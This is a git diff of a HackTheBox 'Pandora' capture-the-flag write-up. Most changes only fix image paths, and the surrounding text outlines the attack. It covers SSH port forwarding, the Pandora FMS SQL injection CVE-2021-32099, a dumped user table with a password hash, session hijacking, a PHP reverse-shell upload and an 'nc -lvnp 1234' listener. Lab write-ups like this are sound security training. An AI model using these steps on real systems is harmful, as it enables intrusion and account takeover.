@@ -2,7 +2,7 @@
 
 # Pandora - HackTheBox WriteUp
 
-<img src="htb_assets/images/pandora/2022-06-02-05-34-30-image.png" style="margin-left: 20px; zoom: 60%;" align=left />
+<img src="../htb_assets/images/pandora/2022-06-02-05-34-30-image.png" style="margin-left: 20px; zoom: 60%;" align=left />
 
 ## 1. Enumeration
 
@@ -30,7 +30,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 Port 80 is open and we can find website there.
 
-<img src="htb_assets/images/pandora/2022-06-01-00-30-19-image.png" style="margin-left: 20px; zoom: 60%;" align=left />
+<img src="../htb_assets/images/pandora/2022-06-01-00-30-19-image.png"/>
 
 
 
@@ -141,14 +141,14 @@ ssh -L 8000:127.0.0.1:80 daniel@10.129.99.118
 
 Now, browse for localhost:8000 on our browser.
 
-![](/htb_assets/images/pandora/2022-06-01-00-31-29-image.png)
+<img src="../htb_assets/images/pandora/2022-06-01-00-31-29-image.png"/>
 
 Looking at the bottom of that page exposes the version of the Pandora FMS, which is
 v7.0NG.742_FIX_PERL2020 .
 
 We can find an unauthenticated SQL Injection (CVE-2021-32099).
 
-![](/htb_assets/images/pandora/2022-06-01-12-49-41-image.png)
+<img src="../htb_assets/images/pandora/2022-06-01-12-49-41-image.png"/>
 
 
 
@@ -541,9 +541,6 @@ Table: tusuario
 | 0       | matt    | NULL      | matt@pandora.htb   | <blank> | <blank>  | 0        | Matt     | 0        | <blank>  | f655f807365b6dc602b31ab3d6d43acc | 0        | <blank>  | Default   | <blank>   | 0         | default    | 20         | -1         | 1623425334 | 0          | <blank>      | 1638796349   | -1           | 0             | NULL          | 0              | 0000-00-00 00:00:00 | 30               | 0                 | 0000-00-00 00:00:00 | basic              | 0                   | 0                    | <blank>                | <blank>                | <blank>                | 0                       | 0                         | 0                          | 0                           |
 +---------+---------+-----------+--------------------+---------+----------+----------+----------+----------+----------+----------------------------------+----------+----------+-----------+-----------+-----------+------------+------------+------------+------------+------------+--------------+--------------+--------------+---------------+---------------+----------------+---------------------+------------------+-------------------+---------------------+--------------------+---------------------+----------------------+------------------------+------------------------+------------------------+-------------------------+---------------------------+----------------------------+-----------------------------+
 
-[10:54:03] [INFO] table 'pandora.tusuario' dumped to CSV file '/root/.local/share/sqlmap/output/localhost/dump/pandora/tusuario.csv'
-[10:54:03] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/localhost'
-
 ```
 
 
@@ -623,7 +620,7 @@ Table: tsessions_php
 
 Take session_id of matt, open developer tools, change the session id and refresh the page. We will be logged in as matt.
 
-![](/htb_assets/images/pandora/2022-06-01-11-12-51-image.png)
+<img src="../htb_assets/images/pandora/2022-06-01-11-12-51-image.png"/>
 
 
 
@@ -632,19 +629,19 @@ Open new tab and run this url with sql injection payload
 
 Thus, we will be logged into admin page.
 
-![](/htb_assets/images/pandora/2022-06-01-13-02-44-image.png)
+<img src="../htb_assets/images/pandora/2022-06-01-13-02-44-image.png"/>
 
 
 
 We can find an image upload functionality in the admin page. 
 
-![](/htb_assets/images/pandora/2022-06-01-13-13-45-image.png)
+<img src="../htb_assets/images/pandora/2022-06-01-13-13-45-image.png"/>
 
 
 
 Upload a php reverse shell and browse to http://localhost:8000/pandora_console/images . We can find the uploaded shell code. 
 
-![](/htb_assets/images/pandora/2022-06-01-13-14-24-image.png)
+<img src="../htb_assets/images/pandora/2022-06-01-13-14-24-image.png"/>
 
 
 
@@ -656,7 +653,7 @@ nc -lvnp 1234
 
 Click on the uploaded shell code shell.php and we will get a reverse shell. Change the directory to matt and we can find the user.txt.
 
-![](/htb_assets/images/pandora/2022-06-01-13-15-36-image.png)
+<img src="../htb_assets/images/pandora/2022-06-01-13-15-36-image.png"/>
 
 
 
